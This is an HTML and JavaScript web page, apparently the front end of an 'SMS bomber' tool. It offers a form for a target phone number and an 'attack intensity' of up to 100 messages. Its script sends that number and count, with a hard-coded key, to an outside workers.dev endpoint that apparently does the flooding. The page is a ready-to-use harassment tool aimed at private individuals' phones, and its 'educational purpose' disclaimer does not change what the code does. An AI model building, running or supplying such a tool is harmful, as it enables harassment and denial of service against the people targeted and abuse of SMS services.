<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAIZAN SMS BOMBER // BLUE_PROTOCOL</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #02040a;
            --surface-color: rgba(10, 20, 40, 0.7);
            --border-color: #1e3a8a;
            --neon-blue: #00f3ff;
            --deep-blue: #2979ff;
            --alert-red: #ff2a6d;
            --text-main: #e0f2fe;
            --text-muted: #94a3b8;
            --font-tech: 'Fira Code', monospace;
            --font-display: 'Rajdhani', sans-serif;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: var(--font-display);
            background-color: var(--bg-dark);
            /* Moving Grid Background */
            background-image: 
                linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            animation: moveGrid 20s linear infinite;
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        @keyframes moveGrid {
            0% { background-position: 0 0; }
            100% { background-position: 40px 40px; }
        }

        /* HEADER & LOGO */
        .site-header {
            text-align: center;
            margin-bottom: 35px;
            margin-top: 30px;
            position: relative;
        }

        .logo-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
        }

        .logo-img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid var(--neon-blue);
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
            position: relative;
            z-index: 2;
        }

        /* Rotating Ring Animation */
        .logo-ring {
            position: absolute;
            top: -10px; left: -10px; right: -10px; bottom: -10px;
            border: 2px dashed var(--deep-blue);
            border-radius: 50%;
            animation: rotateRing 10s linear infinite;
            z-index: 1;
        }

        @keyframes rotateRing { to { transform: rotate(360deg); } }

        .site-header h1 {
            font-size: 2.2rem;
            font-weight: 700;
            letter-spacing: 2px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }

        .status-badge {
            display: inline-block;
            background: rgba(0, 243, 255, 0.1);
            border: 1px solid var(--neon-blue);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            color: var(--neon-blue);
            font-family: var(--font-tech);
            box-shadow: 0 0 10px rgba(0, 243, 255, 0.2);
        }

        /* MAIN PANEL */
        .control-panel-container {
            background: var(--surface-color);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(0, 243, 255, 0.15);
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
            padding: 40px;
            max-width: 550px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        /* Top Blue Bar */
        .control-panel-container::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: linear-gradient(90deg, var(--deep-blue), var(--neon-blue), var(--deep-blue));
            box-shadow: 0 0 15px var(--neon-blue);
        }

        .form-group { margin-bottom: 25px; }

        .form-group label {
            display: block;
            font-family: var(--font-tech);
            color: var(--neon-blue);
            font-size: 0.85rem;
            margin-bottom: 10px;
            letter-spacing: 1px;
        }

        .input-wrapper {
            position: relative;
        }

        .form-group input[type="tel"] {
            width: 100%;
            padding: 16px 20px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: #fff;
            font-family: var(--font-tech);
            font-size: 1.1rem;
            transition: 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.15);
            background: rgba(0, 243, 255, 0.02);
        }

        /* Intensity Selector */
        .intensity-control {
            display: flex;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 12px;
            padding: 5px;
            border: 1px solid var(--border-color);
        }

        .intensity-control label {
            flex: 1;
            text-align: center;
            padding: 10px;
            margin-bottom: 0;
            cursor: pointer;
            border-radius: 8px;
            color: var(--text-muted);
            transition: 0.3s;
            font-size: 0.9rem;
        }

        .intensity-control input[type="radio"] { display: none; }

        .intensity-control input:checked + label {
            background: linear-gradient(135deg, var(--deep-blue), var(--neon-blue));
            color: #000;
            font-weight: 700;
            box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
        }

        /* MAIN ACTION BUTTON */
        #trigger-btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(90deg, #0061ff, #60efff);
            color: #000;
            font-family: var(--font-display);
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            margin-top: 10px;
        }

        #trigger-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 30px rgba(0, 243, 255, 0.5);
        }

        #trigger-btn:disabled {
            background: #1e293b;
            color: #64748b;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* LOGS AREA */
        .results-area { margin-top: 30px; }

        #system-log-live {
            background: #050b14;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            height: 200px;
            overflow-y: auto;
            font-family: var(--font-tech);
            font-size: 0.85rem;
            color: var(--text-muted);
            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
        }

        .log-entry { margin-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px; }
        .text-blue { color: var(--neon-blue); }
        .text-red { color: var(--alert-red); }

        /* Custom Scrollbar */
        #system-log-live::-webkit-scrollbar { width: 6px; }
        #system-log-live::-webkit-scrollbar-thumb { background: var(--deep-blue); border-radius: 3px; }

        .site-footer {
            margin-top: 40px;
            color: var(--text-muted);
            font-size: 0.9rem;
            text-align: center;
            opacity: 0.8;
            padding-bottom: 20px;
        }

        /* Whatsapp Button Style */
        .wa-btn {
            display: inline-block;
            margin-top: 15px;
            padding: 12px 25px;
            background: transparent;
            border: 1px solid var(--neon-blue);
            color: var(--neon-blue);
            text-decoration: none;
            border-radius: 50px;
            font-family: var(--font-tech);
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 0 10px rgba(0, 243, 255, 0.1);
        }

        .wa-btn:hover {
            background: rgba(0, 243, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.4);
            transform: translateY(-2px);
            color: #fff;
        }

        /* Loading Spinner */
        .spinner {
            width: 20px; height: 20px;
            border: 3px solid rgba(0,0,0,0.3);
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <header class="site-header">
        <div class="logo-container">
            <div class="logo-ring"></div>
            <img src="https://i.supaimg.com/bf5a170e-e362-4492-b3bb-c212a003afa0.jpg" alt="FAIZAN SMS BOMBER" class="logo-img">
        </div>
        <h1>FAIZAN SMS BOMBER</h1>
        <div class="status-badge">● SYSTEM V5.0 ONLINE</div>
    </header>

    <main class="control-panel-container">
        <div class="form-group">
            <label>TARGET PHONE NUMBER</label>
            <div class="input-wrapper">
                <input type="tel" id="recipient-number" placeholder="Enter number (e.g. 923xxxxxxxxx)">
            </div>
        </div>

        <div class="form-group">
            <label>ATTACK INTENSITY</label>
            <div class="intensity-control">
                <input type="radio" id="lvl1" name="intensity" value="10" checked>
                <label for="lvl1">LOW</label>

                <input type="radio" id="lvl2" name="intensity" value="25">
                <label for="lvl2">MED</label>

                <input type="radio" id="lvl3" name="intensity" value="50">
                <label for="lvl3">HIGH</label>

                <input type="radio" id="lvl4" name="intensity" value="100">
                <label for="lvl4">MAX</label>
            </div>
        </div>

        <button id="trigger-btn">START OPERATION</button>

        <div class="results-area">
            <label style="font-family: var(--font-tech); color: var(--neon-blue); font-size: 0.8rem; margin-bottom: 5px; display: block;">LIVE TERMINAL LOG</label>
            <div id="system-log-live">
                <div class="log-entry">> System Initialized...</div>
                <div class="log-entry">> Waiting for user input...</div>
            </div>
        </div>
    </main>

    <footer class="site-footer">
        <p>© 2025 MUHAMMAD FAIZAN AHMED</p>
        <p style="font-size: 0.75rem; margin-top: 5px;">Created for Educational Purpose Only.</p>
        
        <a href="" target="_blank" class="wa-btn">
            MUHAMMAD FAIZAN AHMED 
        </a>
    </footer>

    <script>
        const API_CONFIG = {
            url: 'https://fak-sms-boomber.jokerkeep057.workers.dev/',
            key: '32563'
        };

        const ui = {
            btn: document.getElementById('trigger-btn'),
            input: document.getElementById('recipient-number'),
            log: document.getElementById('system-log-live'),
            intensity: () => document.querySelector('input[name="intensity"]:checked').value
        };

        function addLog(msg, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'log-entry';
            
            const time = new Date().toLocaleTimeString('en-US', {hour12: false, hour: "numeric", minute: "numeric", second: "numeric"});
            let colorClass = '';
            if(type === 'success') colorClass = 'text-blue';
            if(type === 'error') colorClass = 'text-red';

            div.innerHTML = `<span style="opacity:0.5">[${time}]</span> <span class="${colorClass}">${msg}</span>`;
            ui.log.appendChild(div);
            ui.log.scrollTop = ui.log.scrollHeight;
        }

        ui.btn.addEventListener('click', async () => {
            const number = ui.input.value.trim();
            const count = ui.intensity();

            if (!number || number.length < 10) {
                addLog("Error: Invalid Number Format", 'error');
                return;
            }

            ui.btn.disabled = true;
            ui.btn.innerHTML = '<div class="spinner"></div> PROCESSING...';
            addLog(`Target locked: ${number}`, 'success');
            addLog(`Initiating sequence with ${count} packets...`);

            try {
                const requestUrl = `${API_CONFIG.url}?key=${API_CONFIG.key}&number=${number}&count=${count}`;
                const response = await fetch(requestUrl);
                const data = await response.json();

                if (data.success || response.ok) {
                    addLog("Status: OPERATION SUCCESSFUL", 'success');
                    addLog(`Server Response: ${JSON.stringify(data)}`, 'success');
                } else {
                    throw new Error(data.error || 'Unknown API Error');
                }
            } catch (err) {
                console.error(err);
                addLog("Status: CONNECTION FAILED", 'error');
                addLog(`Reason: ${err.message}`, 'error');
            } finally {
                ui.btn.disabled = false;
                ui.btn.innerText = 'START OPERATION';
            }
        });
    </script>
</body>
</html>
